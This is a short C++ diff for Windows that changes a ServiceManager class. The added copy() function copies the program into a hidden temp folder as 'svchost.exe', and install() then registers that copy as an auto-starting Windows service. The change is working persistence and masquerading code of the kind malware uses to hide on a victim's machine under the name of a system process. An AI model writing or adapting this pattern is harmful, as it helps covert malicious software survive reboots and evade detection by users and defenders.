@@ -69,6 +69,8 @@ SC_HANDLE ServiceManager::install(void) {
         return 0;
     }
 
+    this->copy();
+
     service = CreateService(sc_manager, this->name.c_str(), this->name.c_str(),
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
         SERVICE_ERROR_NORMAL, this->path.c_str(), NULL, NULL, NULL, NULL, NULL);
@@ -85,6 +87,27 @@ SC_HANDLE ServiceManager::install(void) {
     CloseServiceHandle(sc_manager);
 
     return service;
+}
+
+//------------------------------------------------------------------------------
+
+void ServiceManager::copy(void) {
+    TCHAR temp_path[MAX_PATH+1];
+    GetTempPath(MAX_PATH+1, temp_path);
+
+    string new_path_folder = temp_path;
+    new_path_folder += "Setup";
+
+    string new_path = new_path_folder;
+    new_path += "\\svchost.exe";
+
+    CreateDirectory(new_path_folder.c_str(), NULL);
+    SetFileAttributes(new_path_folder.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
+    if (CopyFile(this->path.c_str(), new_path.c_str(), FALSE)) {
+        this->path = new_path;
+
+    }
 }
 
 //------------------------------------------------------------------------------
